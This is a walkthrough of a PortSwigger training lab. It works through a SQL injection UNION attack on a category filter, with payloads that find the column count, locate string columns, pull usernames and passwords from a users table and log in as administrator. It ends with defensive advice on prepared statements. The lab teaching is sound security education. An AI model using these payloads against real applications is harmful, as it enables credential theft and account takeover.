# 📘 PortSwigger Lab: SQL injection UNION attack, retrieving data from other tables

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 Attack idea](#idea)
- [🏗 What is already known](#how)
- [🔍 Step 1 — Determine column count](#step1)
- [🔍 Step 2 — Find string column](#step2)
- [🔍 Step 3 — Retrieve data from users](#step3)
- [🔍 Step 4 — Login as administrator](#step4)
- [💥 Why the attack worked](#why)
- [🛡 Defense](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Retrieve usernames and passwords from the `users` table and log in as `administrator`.

---

<a id="idea"></a>

# 🧠 Attack idea

`UNION SELECT` allows us to append our own SELECT query to the original SQL query.

This makes it possible to read data from other database tables.

---

<a id="how"></a>

# 🏗 What is already known

The lab already provides:

```text
table = users
columns = username,password
```

We need to:
1. determine the number of columns;
2. find a string-compatible column;
3. retrieve usernames/passwords.

---

<a id="step1"></a>

# 🔍 Step 1 — Determine column count

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

✅ Success

---

# Conclusion

The original SELECT query contains:
# 2 columns

---

<a id="step2"></a>

# 🔍 Step 2 — Find string column

```http
/filter?category=Accessories' UNION SELECT 'test',NULL--
```

or:

```http
/filter?category=Accessories' UNION SELECT NULL,'test'--
```

---

# What we are looking for

The moment when:
- the string appears on the page;
- response = 200 OK.

---

# Result

The columns accept string values,
so usernames/passwords can be displayed.

---

<a id="step3"></a>

# 🔍 Step 3 — Retrieve data from users

Final payload:

```http
/filter?category=Accessories' UNION SELECT username,password FROM users--
```

---

# Final SQL query

```sql
SELECT name,description FROM products
WHERE category='Accessories'
UNION SELECT username,password FROM users--'
```

---

# What happened

The application displayed:

```text
administrator
password123
```

and other user credentials.

---

<a id="step4"></a>

# 🔍 Step 4 — Login as administrator

Open:

```text
/login
```

Use:
- username = administrator
- password = extracted password

---

# Result

Successful login as administrator.

The lab was solved.

---

<a id="why"></a>

# 💥 Why the attack worked

Because the application:
- inserted user input directly into SQL;
- did not use prepared statements;
- displayed SQL results to the user.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Safe example:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] SQL Injection identified
- [ ] column count determined
- [ ] string-compatible column identified
- [ ] usernames/passwords retrieved
- [ ] login as administrator completed

---

# ⬆ Back to top

[Return to top](#top)
